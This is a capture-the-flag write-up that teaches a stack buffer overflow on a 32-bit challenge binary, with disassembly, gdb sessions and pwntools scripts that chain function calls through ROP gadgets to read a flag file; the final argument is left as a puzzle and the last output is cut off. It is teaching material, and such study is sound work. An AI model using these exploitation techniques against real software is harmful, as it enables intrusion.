# port-65144 write-up (Buffer Overflow)


I will make this write-up more like a class of buffer overflow since it has a lot of tricks. So I hope you enjoy the read, and hopefully it could be useful for you.

## Intro

Well, I am participating of a CTF Team called <a href="https://twitter.com/RATF_CTFTEAM" target="_blank">RATF</a>, in our private telegram group one of the members shared a <a href="https://twitter.com/joaovitormaiaa/status/1296209914801590272" target="_blank">challenge of XSS</a>, and it makes me think I could do the same but with a different category of CTF, So...

Let's begin with the tweet <a href="https://twitter.com/reisraff/status/1296237893741150210" target="_blank">https://twitter.com/reisraff/status/1296237893741150210</a>

<center><img src="post-assets/port-65144-tweet.png" width="611" alt="Tweet" /></center>

## Knowing the binary

Here we have a link, and the binary name, so lets download the binary:

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ wget  http://173.230.139.237/port-65144
--2020-08-31 14:44:46--  http://173.230.139.237/port-65144
Connecting to 173.230.139.237:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13808 (13K)
Saving to: ‘port-65144’

port-65144                                  100%[========================================================================================>]  13.48K  --.-KB/s    in 0s

2020-08-31 14:44:46 (95.8 MB/s) - ‘port-65144’ saved [13808/13808]

```

I will make a backup of the binary <a href="post-assets/port-65144" target="_blank">here</a> in case the original challenge link is down.

### Static Analysis

Basics commands first just to know the binary

```bash
# md5sum
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ md5sum port-65144
aab94814547f2fbf3c36528fe52b071e  port-65144

# file command
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ file port-65144
port-65144: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=dc5a9b5efbdeea355254ae0af173f75602c3873a, for GNU/Linux 3.2.0, stripped

```

As we can see we have an ELF 32bits binary that is stripped.

Let's start with the basics to understand what it does, and how we can bypass this ;)

I like to start running `strings` into the binary and dumping the binary to a `.dump` file:

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ strings port-65144 > port-65144.strings.txt
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ ls -l
total 40
-rwxr-xr-x 1 reisraff reisraff 13808 Aug 31 14:37 port-65144
-rw-r--r-- 1 reisraff reisraff   527 Aug 31 17:17 port-65144.strings.txt
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ head port-65144.strings.txt
td`
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
gets
exit
puts
printf
mmap
lseek
```

Running a `cat` over the `port-65144.strings.txt` we can see there are some libc functions that were exported like `puts`, `printf`, `open` and we also can see that has a `/code/ROP-me/flag.txt` string that could be a file. We can guess it combined with the `open` function could print out the flag!?!?

And now I will dump the assembly:

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ objdump -dM intel port-65144 > port-65144.dump
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ ls -l
total 36
-rw-r--r-- 1 reisraff reisraff 13808 Aug 31 14:37 port-65144
-rw-r--r-- 1 reisraff reisraff 19822 Aug 31 15:21 port-65144.dump
-rw-r--r-- 1 reisraff reisraff   527 Aug 31 17:17 port-65144.strings.txt
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ head port-65144.dump

port-65144:     file format elf32-i386


Disassembly of section .init:

08049000 <.init>:
 8049000: f3 0f 1e fb           endbr32
 8049004: 53                    push   ebx
 8049005: 83 ec 08              sub    esp,0x8
reisraff@3dbbde46a935:~/workdir/challs/port-65144$

```

In the file `port-65144.dump` the program itself is under the `<.text>` section, so it is the only section that is important for us now, but since it is stripped we can not see the separation by function name, knowing a bit of <a href="https://en.wikipedia.org/wiki/X86_calling_conventions" target="_blank">"Calling Conventions"</a> we know that the `ret` instruction is supposed to be the end of functions, so what I made to make it easier to read is put new lines after each `ret`. It becomes like this:

```raw
08049140 <.text>:
 ...
 804916a: c7 c0 f2 93 04 08     mov    eax,0x80493f2
 8049170: 50                    push   eax
 8049171: e8 ba ff ff ff        call   8049130 <__libc_start_main@plt>
 8049176: f4                    hlt
 8049177: 8b 1c 24              mov    ebx,DWORD PTR [esp]
 804917a: c3                    ret


 804917b: 66 90                 xchg   ax,ax
 804917d: 66 90                 xchg   ax,ax
 804917f: 90                    nop
 8049180: f3 0f 1e fb           endbr32
 8049184: c3                    ret


 8049185: 66 90                 xchg   ax,ax
 8049187: 66 90                 xchg   ax,ax
 8049189: 66 90                 xchg   ax,ax
 804918b: 66 90                 xchg   ax,ax
 804918d: 66 90                 xchg   ax,ax
 804918f: 90                    nop
 8049190: 8b 1c 24              mov    ebx,DWORD PTR [esp]
 8049193: c3                    ret


 8049194: 66 90                 xchg   ax,ax
 8049196: 66 90                 xchg   ax,ax
 8049198: 66 90                 xchg   ax,ax
 ...
 ```

### Stripped binary

A stripped binary is a binary that don't have yours symbols exported, when I say symbols I want to say for example the function names i.e `main`. Then in this condition we can not use tools like gdb and make a breakpoint using the symbols like:

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ gdb port-65144
...
Reading symbols from port-65144...
(No debugging symbols found in port-65144)
gef➤  break main
Function "main" not defined.
gef➤
```

### Main function

It is a condition that we can bypass just by using the effective address, but how can I know where is the `main`?

With gdb it is simple, just type `info files` and it will give you the entrypoint of the program:

```bash
gef➤  info files
Symbols from "/home/reisraff/workdir/challs/port-65144/port-65144".
Local exec file:
  `/home/reisraff/workdir/challs/port-65144/port-65144', file type elf32-i386.
  Entry point: 0x8049140
  0x080481b4 - 0x080481c7 is .interp
  0x080481c8 - 0x080481ec is .note.gnu.build-id
  0x080481ec - 0x08048208 is .note.gnu.property
  0x08048208 - 0x08048228 is .note.ABI-tag
  ...
```

The entrypoint is supposed to be `0x8049140` but it still is not our `main` it is a code that will call our main. Well in this case, it is just to find a sequence of `mov eax, ???; push eax; call` after this entrypoint:

```raw
 804916a: c7 c0 f2 93 04 08     mov    eax,0x80493f2
 8049170: 50                    push   eax
 8049171: e8 ba ff ff ff        call   8049130 <__libc_start_main@plt>
```

Our `main` is supposed to be at the address `0x80493f2` that is pushed to the stack as argument of the function `__libc_start_main@plt` this function will prepare the `argc`, `argv`, `env vars`, etc... to be the argument of our `main`, and then call it.

Ok, now that we know where is our `main`, let's start analyse the code.

## Code analysis

Our main is calling (`call`) two functions:

```raw
 80493f2: f3 0f 1e fb           endbr32
 80493f6: 8d 4c 24 04           lea    ecx,[esp+0x4]
 80493fa: 83 e4 f0              and    esp,0xfffffff0
 80493fd: ff 71 fc              push   DWORD PTR [ecx-0x4]
 8049400: 55                    push   ebp
 8049401: 89 e5                 mov    ebp,esp
 8049403: 53                    push   ebx
 8049404: 51                    push   ecx
 8049405: e8 86 fd ff ff        call   8049190 <__libc_start_main@plt+0x60>
 804940a: 81 c3 f6 2b 00 00     add    ebx,0x2bf6
 8049410: e8 9a ff ff ff        call   80493af <__libc_start_main@plt+0x27f>
```

If we look the first call address (`0x8049190`) we can see that it is just doing a `mov ; ret` so may it is not what we are looking for.

```raw
 8049190:  8b 1c 24              mov    ebx,DWORD PTR [esp]
 8049193:  c3                    ret
```

But seeing the second call address (`0x80493af`) we can see more things happening:

```raw
 80493af: f3 0f 1e fb           endbr32
 80493b3: 55                    push   ebp
 80493b4: 89 e5                 mov    ebp,esp
 80493b6: 53                    push   ebx
 80493b7: 81 ec a4 00 00 00     sub    esp,0xa4
 80493bd: e8 ce fd ff ff        call   8049190 <__libc_start_main@plt+0x60>
 80493c2: 81 c3 3e 2c 00 00     add    ebx,0x2c3e
 80493c8: 83 ec 0c              sub    esp,0xc
 80493cb: 8d 83 3b e0 ff ff     lea    eax,[ebx-0x1fc5]
 80493d1: 50                    push   eax
 80493d2: e8 e9 fc ff ff        call   80490c0 <printf@plt>
 80493d7: 83 c4 10              add    esp,0x10
 80493da: 83 ec 0c              sub    esp,0xc
 80493dd: 8d 85 58 ff ff ff     lea    eax,[ebp-0xa8]
 80493e3: 50                    push   eax
 80493e4: e8 e7 fc ff ff        call   80490d0 <gets@plt>
 80493e9: 83 c4 10              add    esp,0x10
 80493ec: 90                    nop
 80493ed: 8b 5d fc              mov    ebx,DWORD PTR [ebp-0x4]
 80493f0: c9                    leave
 80493f1: c3                    ret
```

Ok, this function is an interesting one 'cause it makes use of the function <a href="https://man7.org/linux/man-pages/man3/gets.3.html#BUGS" target="_blank">"gets"</a>, and when we see this, we know it leads us to a <a href="https://en.wikipedia.org/wiki/Buffer_overflow" target="_blank">"Buffer Overflow"</a>


## Buffer Overflow

To understand what is this vulnerability and how to take advantage of it, we have to understand first the `stack` and the `process`.

### Stack segment

Stack is one of the memory segments. The `.data`, `.bss`, `heap` also are segments of memory, but for now the stack is the one.

The stack is a data type where you can `push` (which add elements to it) and `pop` (that removes the most recently added element) and the order that things are ordered in it give us a name of LIFO (last in, first out). One last important thing is that the stack grows decreasing the address number.

### Process

All we have to know for this challenge is that for a program to work we have to point an instruction like `80493e4: e8 e7 fc ff ff        call   80490d0 <gets@plt>` into a variable or better a register that can change its identifier depending on what architecture you are, in this case we are in the i386 so its identifier is the `EIP` a.k.a Instruction Pointer.

The value contained in the EIP is increased after all executed instruction pointing to the next instruction, but there are some instructions that change this behavior by setting the value of the EIP like the `call` and `ret` instructions, where for the `call` its operand will be set into the EIP, and the `ret` will grab the address of the next instruction from the stack.


```raw
+++++++++++
higest addr
+==STACK==+
+++++++++++    When we enter in a function the process will
+++++++++++   separate a space into the stack to put local
+++++++++++   variables
+++++++++++
+   EIP   +   the EIP is saved into the stack for returning pruposes
+   EBP   +   the EBP is another register but not important for now
+   VAR1  +   and here starts our local variables.
+   VAR2  +
+   VAR3  +   if this variable is passed to the gets function we can
+   ...   +   overwrite all values above, like VAR2, VAR1, EBP, and the EIP
+   ...   +
+   ...   +
+   ...   +
+   ESP   +
+         +
+         +
+         +
+++++++++++
lowest addr
+++++++++++
```

Why the EIP is saved it is simple lets see this little piece of code:

```raw
 80493d1: 50                    push   eax                      here ok
 80493d2: e8 e9 fc ff ff        call   80490c0 <printf@plt>     then we cange the EIP from 0x80493d2 to 0x80490c0
                                                                after the printf makes the `ret` it will return
                                                                to the saved EIP that is 0x80493d7 the instruction bellow
 80493d7: 83 c4 10              add    esp,0x10
```


## Exploiting

Now that we know the basics lets exploit it. Looking to the code of the vulnerable function we can see that the variable we can take advantage is the:

```
 80493dd: 8d 85 58 ff ff ff     lea    eax,[ebp-0xa8]
 80493e3: 50                    push   eax
 80493e4: e8 e7 fc ff ff        call   80490d0 <gets@plt>
```

Yeap the `ebp-0xa8`. The `ebp` will have an address, we will subtract the `0xa8` from it and `lea` (load efective address) into the `eax` then push to the stack where is supposed to be the arguments to the function `gets` when it is called.

All variables have its own size, in this case is easy to know what is the size of this variable just by converting the `0xa8` to decimal that is 168. Ok with 168 bytes we fully fill the variable, now we have to replace the stack things until arrive to EIP and take control of the program. the assembly already told us that we have `0xa8` bytes until we arrive to `EBP` ok, in this arch this register has 4 bytes, so lets add it to our number and we have 172.

Let's test?

```bash
# here we will add the permission to execute the program
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ chmod +x port-65144

# here we understan how is supposed to be the input we will give to the program
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ ./port-65144
Enter your buffer: asdf
not this time


# here we send the payload with 172 charactes "A" and 4 "B" and we see that the message change to "Segmentation fault (core dumped)"
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ echo $(python3 -c "print('A' * 172)")BBBB | ./port-65144
Segmentation fault (core dumped)

# and here we can check the segfault
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ dmesg | tail -n 1
[39206.428987] port-65144[5871]: segfault at 42424242 ip 0000000042424242 sp 00000000ffba4d50 error 14 in libc-2.30.so[f7dc5000+1d000]
```

This last message says us that the `IP` or `EIP` had value of `0000000042424242` and the segfault was in this address. If we see the <a href="https://www.ascii-code.com/" target="_blank">ASCII Table</a> we can confirm that the number `0x42` (hexadecimal) is the same as "B", knowing it, and remembering we sent 4 "B"s and the IP is `0000000042424242` 4 entries of 42.... hmm.... gotcha! We can overwrite the `EIP`.

Now we have it, let's see what we can do with this binary:

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ checksec port-65144
[*] '/home/reisraff/workdir/challs/port-65144/port-65144'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
reisraff@3dbbde46a935:~/workdir/challs/port-65144$
```

Not that easy, we have some <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Protection_schemes" target="_blank">properties of security</a> enabled in this binary, the one that will make it more difficult is the <a href="https://en.wikipedia.org/wiki/NX_bit" target="_blank">NX</a> "no execute stack". With this we can't simple add malicious code into our payload and point to it address, so we have to read the code a little bit more, but wait... I remember that we had something `flag.txt` and the `open` function, may we could point to it...

I love analyse code by just reading the assembly but now I think is better to explain with <a href="https://ghidra-sre.org/" target="_blank">ghidra</a>.

<center><img src="post-assets/port-65144-ghidra-1.png" width="732" alt="ghidra" /></center>

This is the function that has the `open` function, I just jumped to it feeling that we could point to it and got the flag, but as we can see, it opens the flag file, but just print it out if pass some conditions, so we have to think about it. Lets understand it:

```raw
(DAT_0804c035 != 0) # the variable in the data segment in the address 0x0804c035 should be different than 0
&& (DAT_0804c036 != 0) # and the variable in the data segment in the address 0x0804c036 should be different than 0

&& param_1 - (uint)DAT_0804c035 == (uint)DAT_0804c036) # should evaluate to true that is
                                                       # param_1 - int(DAT_0804c035) should be equal to int(DAT_0804c036)
```

As these two variables `0x0804c035` and `0x0804c035` is marked as `DAT` I think it is in the `.data` segment but lets confirm 'cause it could be in the `.bss` segment instead.

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ readelf -S port-65144 | grep 0804c
  [24] .got.plt          PROGBITS        0804c000 003000 00002c 04  WA  0   0  4
  [25] .data             PROGBITS        0804c02c 00302c 000008 00  WA  0   0  4
  [26] .bss              NOBITS          0804c034 003034 000004 00  WA  0   0  1
```

The `.bss` starts in at `0x0804c034` that is less than `0x0804c035` and `0x0804c035`, so this 2 variables being in this section of <a href="https://en.wikipedia.org/wiki/Data_segment#:~:text=The%20BSS%20segment%2C%20also%20known,explicit%20initialization%20in%20source%20code." target="_blank">.bss</a>

### .bss segment

The `.bss` segment is the location where not initialized global variables are, or global variables initialized with value 0 (zero)

Now I just have to found in the code where this variables are set to 1 or true!?

Looking at the code by just doing static analysis I couldn't, so I decided to start over, and I remember I saw "gotcha func1" and "gotcha func2", I try to find it by just making a static analysis but NOT, but I found 2 calls for the function `puts` that can print these two strings out.


<center><img src="post-assets/port-65144-ghidra-2.png" width="446" alt="ghidra" /></center>
<center><img src="post-assets/port-65144-ghidra-3.png" width="662" alt="ghidra" /></center>

As ghidra is not helping me too much, I could try this 2 functions and see what it prints out. First thing we have to know is the function address.
Well ghidra is saying the address for the first function is `0x8049256` based on the function name.

This function has 2 arguments knowing that in 32bits the arguments goes in the stack, it is easy. I can see that the first argument should be equal `0x9c` and the second one `300`, so lets make an script `exploit.py`:

```python
#!/usr/bin/env python
import pwn

# pwn.context.log_level = 'debug'

f1 = pwn.p32(0x8049256)      # function address
f1arg1 = pwn.p32(0x9c)       # 1st argument
f1arg2 = pwn.p32(300)        # 2nd argument

buff = 'A' * 172             # our buffer with 172 A

"""
Now we put all together
buffer + function address + 'JUNK' + first argument + second argument
"""
payload = buff.encode() \
    + f1 \
    + 'JUNK'.encode() \
    + f1arg1 \
    + f1arg2

open('payload.txt', 'w').write(payload.decode('iso-8859-1'))

elf = pwn.ELF('./port-65144')
p = elf.process()
p.sendline(payload)

print('=========================')
print('what the process returned')
print(p.recv().decode())
```

Ok this exploit will return us:

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ python3 exploit.py
[*] '/home/reisraff/workdir/challs/port-65144/port-65144'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/reisraff/workdir/challs/port-65144/port-65144': pid 976
=========================
what the process returned
Enter your buffer: gotcha func1

```

I am using the <a href="https://pypi.org/project/pwntools/" target="_blank">pwn library</a> with python3.

Explaining the exploit, I am just sending 172 bytes of "A" character, overwriting the `EPI` with the `f1` (function address), after the `EPI` we have the saved `EBP` that for us, it is not important now, then I put `JUNK`, and we have our local variables, that I put in order the values `0x9c` and `300`.

I just also wrote a file called `payload.txt` in order to debug with `gdb` later.

I will put a breakpoint in the address `0x804927d` 'cause I think it is changing an already known important variable.

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ gdb port-65144
Reading symbols from port-65144...
(No debugging symbols found in port-65144)
gef➤  break *0x804927d
gef➤  run < payload.txt
```

Remember the variable that is in `.bss` its address is `0x0804c035` so I just printed this out, before execute the breakpoint:

```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0804c000  →  0x0804bf14  →  0x00000001
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0xf7f0d580  →  0xfbad2088
$edx   : 0xff8e788c  →  0xf7d4be00  →  <__libc_start_main+0> call 0xf7e6c009
$esp   : 0xff8e7874  →  0x41414141 ("AAAA"?)
$ebp   : 0xff8e787c  →  0x41414141 ("AAAA"?)
$esi   : 0xf7f0d000  →  0x001dfd6c
$edi   : 0xf7f0d000  →  0x001dfd6c
$eip   : 0x0804927d  →   mov BYTE PTR [eax+0x35], 0x1
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xff8e7874│+0x0000: 0x41414141   ← $esp
0xff8e7878│+0x0004: 0x41414141
0xff8e787c│+0x0008: 0x41414141   ← $ebp
0xff8e7880│+0x000c: 0x42424242
0xff8e7884│+0x0010: 0x0000009c
0xff8e7888│+0x0014: 0x0000012c
0xff8e788c│+0x0018: 0xf7d4be00  →  <__libc_start_main+0> call 0xf7e6c009
0xff8e7890│+0x001c: 0xf7f0d000  →  0x001dfd6c
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x804926d                  or     BYTE PTR [eax+eax*1+0x24750000], bl
    0x8049274                  cmp    DWORD PTR [ebp+0xc], 0x12c
    0x804927b                  jne    0x8049298
 →  0x804927d                  mov    BYTE PTR [eax+0x35], 0x1
    0x8049284                  sub    esp, 0xc
    0x8049287                  lea    edx, [eax-0x1ff8]
    0x804928d                  push   edx
    0x804928e                  mov    ebx, eax
    0x8049290                  call   0x80490f0 <puts@plt>
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "port-65144", stopped 0x804927d in ?? (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804927d → mov BYTE PTR [eax+0x35], 0x1
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/x 0x0804c035
0x804c035:  0x00000000
```

Yeah it is 0 (zero), so lets execute the next instruction, and re check!

```bash
gef➤  ni
0x08049284 in ?? ()


[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0804c000  →  0x0804bf14  →  0x00000001
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0xf7f0d580  →  0xfbad2088
$edx   : 0xff8e788c  →  0xf7d4be00  →  <__libc_start_main+0> call 0xf7e6c009
$esp   : 0xff8e7874  →  0x41414141 ("AAAA"?)
$ebp   : 0xff8e787c  →  0x41414141 ("AAAA"?)
$esi   : 0xf7f0d000  →  0x001dfd6c
$edi   : 0xf7f0d000  →  0x001dfd6c
$eip   : 0x08049284  →   sub esp, 0xc
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xff8e7874│+0x0000: 0x41414141   ← $esp
0xff8e7878│+0x0004: 0x41414141
0xff8e787c│+0x0008: 0x41414141   ← $ebp
0xff8e7880│+0x000c: 0x42424242
0xff8e7884│+0x0010: 0x0000009c
0xff8e7888│+0x0014: 0x0000012c
0xff8e788c│+0x0018: 0xf7d4be00  →  <__libc_start_main+0> call 0xf7e6c009
0xff8e7890│+0x001c: 0xf7f0d000  →  0x001dfd6c
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049274                  cmp    DWORD PTR [ebp+0xc], 0x12c
    0x804927b                  jne    0x8049298
    0x804927d                  mov    BYTE PTR [eax+0x35], 0x1
 →  0x8049284                  sub    esp, 0xc
    0x8049287                  lea    edx, [eax-0x1ff8]
    0x804928d                  push   edx
    0x804928e                  mov    ebx, eax
    0x8049290                  call   0x80490f0 <puts@plt>
    0x8049295                  add    esp, 0x10
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "port-65144", stopped 0x8049284 in ?? (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8049284 → sub esp, 0xc
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/x 0x0804c035
0x804c035:  0x00000001
```

As the output says "Gotcha func1". We can see that this function change the value of the variable in the `.bss` that is important for later. Now I think we can make the same for the "gotcha func2", but now we have to use a thing called gadgets.

### Gadgets

Gadgets are instructions that help us to control the program flow, in this case we need a gadget that performs a `pop; pop; ret;` why?

Our stack is like this in this moment:

```raw
+++++++++++
higest addr
+==STACK==+
+++++++++++
+++++++++++
+++++++++++
+++++++++++
+         +
+         +
+         +   300                         FUNCTION 1 ARG2
+         +   0x9c                        FUNCTION 1 ARG1
+         +   JUNK                        JUNK FOR NOW
+   EIP   +   0x8049256                   FUNCTION 1 ADDREESS
+   EBP   +   AAAA                        EBP
+   VAR1  +   AAAAAAAAAAAAAAAAAAA...      BUFFER
+         +
+         +
+   ...   +
+   ...   +
+   ...   +
+   ESP   +
+         +
+++++++++++
lowest addr
+++++++++++
```

OK, when then function 1 returns, where we put the `JUNK` will be our next `EIP`, but since we have to pass arguments to the next function we need the gadget to pop the current arguments from the stack to give place to the next `EIP` and the arguments. So we have to pop the arg1 and the arg2.

Let's remember how is the second function, and how we will get the gadget.

<center><img src="post-assets/port-65144-ghidra-3.png" width="662" alt="ghidra" /></center>

This function receive 3 arguments, and the values should be 1st argument = `0` (zero), 2nd and 3rd arguments = `0xd`

For our help, I will install <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank">ROPGadget</a> that will show us what are the gadgets available.

```bash
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ python3 ROPgadget/ROPgadget.py --binary port-65144 | grep pop
0x080494cd : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x0804949d : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804901f : add esp, 8 ; pop ebx ; ret
0x0804942e : clc ; pop ecx ; pop ebx ; pop ebp ; lea esp, [ecx - 4] ; ret
0x08049294 : inc dword ptr [ebx - 0x746fef3c] ; pop ebp ; cld ; leave ; ret
0x0804949c : jecxz 0x8049429 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x0804949b : jne 0x8049489 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804942c : lea esp, [ebp - 8] ; pop ecx ; pop ebx ; pop ebp ; lea esp, [ecx - 4] ; ret
0x08049020 : les ecx, ptr [eax] ; pop ebx ; ret
0x0804949e : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x0804949f : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
0x0804929a : pop ebp ; cld ; leave ; ret
0x08049431 : pop ebp ; lea esp, [ecx - 4] ; ret
0x080494a3 : pop ebp ; ret
0x08049430 : pop ebx ; pop ebp ; lea esp, [ecx - 4] ; ret
0x080494a0 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08049022 : pop ebx ; ret
0x0804942f : pop ecx ; pop ebx ; pop ebp ; lea esp, [ecx - 4] ; ret
0x080494a2 : pop edi ; pop ebp ; ret
0x080494a1 : pop esi ; pop edi ; pop ebp ; ret
0x08049433 : popal ; cld ; ret
0x0804901a : sal byte ptr [edx + eax - 1], 0xd0 ; add esp, 8 ; pop ebx ; ret
reisraff@3dbbde46a935:~/workdir/challs/port-65144$
```

Those above are gadgets, and I just grep for `pop` that is the one we need, I can see that we have a `pop; pop; ret;` in the address `0x080494a2`, so I will update my exploit like this:

```python
#!/usr/bin/env python
import pwn

# pwn.context.log_level = 'debug'

poppopret = pwn.p32(0x080494a2)  # gadgets try ROPgadget

f1 = pwn.p32(0x8049256)     # func1 address
f1arg1 = pwn.p32(0x9c)      # 1st argument of func1
f1arg2 = pwn.p32(300)       # 2nd argument of func1

f2 = pwn.p32(0x804929e)     # func2 address
f2arg1 = pwn.p32(0x0)       # 1st argument of func2
f2arg2 = pwn.p32(0xd)       # 2nd argument of func2
f2arg3 = pwn.p32(0xd)       # 3rd argument of func2

buff = 'A' * 172             # our buffer with 172 A

"""
Now we put all together
buffer + func1 address + poppopret + 1st arg f1 + 2nd arg f1
+ func2 address + JUNK + 1st arg f2 + 2nd arg f2 + 3rd arg f2
"""
payload = buff.encode() \
    + f1 \
    + poppopret \
    + f1arg1 \
    + f1arg2 \
    + f2 \
    + 'JUNK'.encode() \
    + f2arg1 \
    + f2arg2 \
    + f2arg3

open('payload.txt', 'w').write(payload.decode('iso-8859-1'))

elf = pwn.ELF('./port-65144')
p = elf.process()
p.sendline(payload)

print('=========================')
print('what the process returned')
print(p.recv().decode())
```

And it will return us:

```
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ python3 exploit.py
[*] '/home/reisraff/workdir/challs/port-65144/port-65144'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/reisraff/workdir/challs/port-65144/port-65144': pid 2347
=========================
what the process returned
Enter your buffer: gotcha func1
gotcha func2
```

I could guess that the function2 have the same behavior of changing the value of `.bss` variable cause of this instruction:

```raw
80492d7:  c6 80 36 00 00 00 01  mov    BYTE PTR [eax+0x36],0x1
```

And finnaly we do the same for the function that has the `open` with the string `/code/ROP-me/flag.txt`, but in order to this next step works we have to have this file with the exactly path in our machine, so I will create:

```raw
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ sudo mkdir -p /code/ROP-me/
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ echo "FLAG TEST" | sudo tee /code/ROP-me/flag.txt
FLAG TEST
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ cat /code/ROP-me/flag.txt
FLAG TEST
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ sudo chmod 777 -R /code
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ ls /code/ROP-me/flag.txt  -l
-rwxrwxrwx 1 root root 10 Aug 31 22:08 /code/ROP-me/flag.txt
```

Now we are done to the next step, Let's remember how was the function:

<center><img src="post-assets/port-65144-ghidra-1.png" width="732" alt="ghidra" /></center>

OK the first two conditions I think will pass, and the last one depends on param1 value that has to be a value that subtracting `0x01` from it should be equal `0x01`. Why `0x01` 'cause I just printed it out, and it is it:

```
gef➤  x/x 0x0804c035
0x804c035:  0x00000001
```

Which is the value that subtracting 1 from it is equal 1? This one I will let you find alone!

Now we have 3 arguments, we will need a `pop; pop; pop; ret;`, so the final exploit is:

```python
#!/usr/bin/env python
import pwn

# pwn.context.log_level = 'debug'

poppopret = pwn.p32(0x080494a2)  # gadgets try ROPgadget
poppoppopret = pwn.p32(0x080494a1)  # gadgets try ROPgadget

f1 = pwn.p32(0x8049256)     # func1 address
f1arg1 = pwn.p32(0x9c)      # 1st argument of func1
f1arg2 = pwn.p32(300)       # 2nd argument of func1

f2 = pwn.p32(0x804929e)     # func2 address
f2arg1 = pwn.p32(0x0)       # 1st argument of func2
f2arg2 = pwn.p32(0xd)       # 2nd argument of func2
f2arg3 = pwn.p32(0xd)       # 3rd argument of func2

flag = pwn.p32(0x80492fc)   # func3 address
f3arg1 = pwn.p32(??)        # 1st argument of func3

buff = 'A' * 172             # our buffer with 172 A

"""
Now we put all together
buffer + func1 address + poppopret + 1st arg f1 + 2nd arg f1
+ func2 address + poppoppopret + 1st arg f2 + 2nd arg f2 + 3rd arg f2
+ func3 address + JUNK + 1st arg f3

"""
payload = buff.encode() \
    + f1 \
    + poppopret \
    + f1arg1 \
    + f1arg2 \
    + f2 \
    + poppoppopret \
    + f2arg1 \
    + f2arg2 \
    + f2arg3 \
    + flag \
    + 'JUNK'.encode() \
    + f3arg1

open('payload.txt', 'w').write(payload.decode('iso-8859-1'))

elf = pwn.ELF('./port-65144')
p = elf.process()
p.sendline(payload)

print('=========================')
print('what the process returned')
print(p.recv().decode())
```

The output:

```
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ python3 exploit.py
[*] '/home/reisraff/workdir/challs/port-65144/port-65144'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
